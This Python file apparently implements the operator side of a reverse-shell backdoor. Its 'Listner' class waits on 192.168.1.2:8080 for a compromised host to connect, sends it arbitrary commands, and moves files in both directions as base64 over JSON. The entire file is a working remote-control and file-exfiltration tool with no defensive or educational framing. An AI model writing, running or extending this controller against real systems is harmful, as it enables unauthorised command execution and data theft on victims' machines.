import socket, json, base64, os



class Listner:
    def __init__(self, ip, port):
        listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Socket_Family, Socket_Type
        listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # If sockets breaks it will re connect it.

        listner.bind((ip, port))
        listner.listen(0)
        print("[+] Waiting for connection")

        self.connection, address = listner.accept()
        print("[+] Got a connection from ", str(address))


    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_recieve(self):
        json_data = "".encode('utf-8')
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)

            except ValueError:
                continue


    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read())
        except Exception as e:
            if e == FileNotFoundError:
                return "[+] File Not Found"
            elif e == IsADirectoryError:
                return "[+] It's a directory"
            else:
                return "[+] Invalid File"


    def write_file(self, path, file_data):
        try:
            with open(path, "wb") as file:
                data = file_data.encode()
                file.write(base64.b64decode(data))
                return "[+] Download Scuessfully"
        except Exception as e:
            os.remove(path)
            return "[+] File Not Found"


    def execute_remotly(self, command):
        if command[0] == "exit" or command[0] == "quit":
            self.reliable_send(command)
            self.connection.close()
            exit()

        elif command[0] == "Upload" or command[0] == "upload":
            try:
                file_contant = self.read_file(command[1]).decode('utf-8')
            except AttributeError:
                file_contant = self.read_file(command[1])

            command.append(file_contant)

        self.reliable_send(command)
        return self.reliable_recieve()


    def run(self):
        while True:
            command = input("\n>> ")
            command = command.split(" ")
            recive_data = self.execute_remotly(command)

            if command[0] == "Download" or command[0] == "download":
                recive_data = self.write_file(command[1], recive_data)

            print(recive_data)


Start_listner = Listner("192.168.1.2", 8080)
Start_listner.run()

